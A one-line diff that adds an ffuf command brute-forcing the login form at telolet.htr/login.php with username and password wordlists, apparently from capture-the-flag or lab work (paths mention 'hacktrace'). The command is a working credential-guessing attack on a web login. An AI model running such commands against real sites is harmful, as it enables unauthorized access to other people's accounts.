@@ -1,0 +1,1 @@
+ffuf -c -v -w "/root/me/hacktrace/telolet/listuser.txt:USER,/root/me/hacktrace/telolet/listuser:PASS" -u "http://telolet.htr/login.php" -X POST -d "login_username=USER&login_password=PASS&autologin=1&login=Log+in"
